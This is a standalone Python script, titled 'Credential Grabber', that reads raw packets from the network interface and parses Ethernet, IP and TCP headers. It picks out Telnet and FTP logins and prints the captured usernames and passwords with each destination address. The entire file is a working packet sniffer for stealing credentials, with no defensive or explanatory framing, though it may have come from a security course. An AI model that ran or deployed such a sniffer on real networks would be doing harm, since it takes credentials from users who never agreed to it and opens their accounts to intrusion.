#! /usr/bin/python3

import socket
import sys
import re
from struct import *

# TELNET Setup
def clean(s):
    s = s.lstrip('\x7f')
    if len(s) == 0:
        return s
    ls = list(s)
    i = 1
    while i < len(ls) and i > 0:
        if ls[i] == '\x7f':
            del ls[i]
            i -= 1
            del ls[i]
        else:
            i += 1
    return ''.join(ls).replace('\x7f','').rstrip()

capture_buffer = b''
poll_name = False
poll_pass = False

telnet_name_re = re.compile(b'.*login: ?$', re.IGNORECASE)
telnet_pass_re = re.compile(b'.*password: ?$', re.IGNORECASE)

# FTP Setup
ftp_name_re = re.compile(b'USER (?P<username>.+)$')
ftp_pass_re = re.compile(b'PASS (?P<password>.+)$')

# Credentials
credentials = None

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

print("Credential Grabber. (Ctrl+C quits)")
print("Listening...")

while True:
    data = s.recv(65535)

    # Decode Ethernet Frame Header
    eth_header_bytes = data[:14]
    eth_header = unpack('!6s6sH', eth_header_bytes)
    eth_protocol = socket.ntohs(eth_header[2])
    
    # Ignore any non-IP packets
    if eth_protocol != 8:
        continue

    data = data[14:]

    # Decode IP Header
    ip_header_bytes = data[0:20]
    ip_header = unpack('!BBHHHBBH4s4s', ip_header_bytes)
    
    ip_version = ip_header[0] >> 4
    ip_ihl = ip_header[0] & 0xF
    ip_ihl_len = ip_ihl * 4;

    packet_length = ip_header[2]

    time_to_live = ip_header[5]
    protocol = ip_header[6]
    src_address = socket.inet_ntoa(ip_header[8])
    dst_address = socket.inet_ntoa(ip_header[9])

    # Ignore any non TCP packets
    if protocol != 6:
        continue

    tcp_header_bytes = data[ip_ihl_len:ip_ihl_len+20]
    tcp_header = unpack('!HHLLBBHHH', tcp_header_bytes)

    src_port = tcp_header[0]
    dst_port = tcp_header[1]
    seq_num = tcp_header[2]
    ack_num = tcp_header[3]
    
    data_offset = tcp_header[4] >> 4
    
    total_header_size = ip_ihl_len + data_offset * 4

    payload = data[ip_ihl_len+data_offset * 4:]
    
    if len(payload) == 0:
        continue
    
    # Telnet non-command packets
    if (src_port == 23 or dst_port == 23) and payload[0] != 0xFF:
        # Inbound or outbound
        if src_port == 23:
            # Inbound
            if telnet_name_re.match(payload):
                poll_name = True
            elif telnet_pass_re.match(payload):
                poll_pass = True
        elif dst_port == 23:
            # Outbound
            if payload[0] == 0x0d:  
                if poll_name:
                    credentials = [capture_buffer.decode("ASCII"), None]
                    poll_name = False
                elif poll_pass:
                    if credentials is not None:
                        credentials[1] = clean(capture_buffer.decode("ASCII"))
                        print ("TELNET ({0}) {1}:{2}".format(dst_address, *credentials))
                    poll_pass = False
                capture_buffer = b''
            else:
                capture_buffer += payload
    # FTP Packets
    elif src_port in [20,21] or dst_port in [20,21]:
        if src_port == 21:
            # Inbound
            pass
        if dst_port == 21:
            # Outbound
            u = ftp_name_re.match(payload)
            p = ftp_pass_re.match(payload)
            if u is not None:
                credentials = [u['username'].decode("ASCII").rstrip(), None]
            if p is not None:
                if credentials is not None:
                    credentials[1] = p['password'].decode("ASCII").rstrip()
                    print ("FTP ({0}) {1}:{2}".format(dst_address, *credentials))

            
            



    

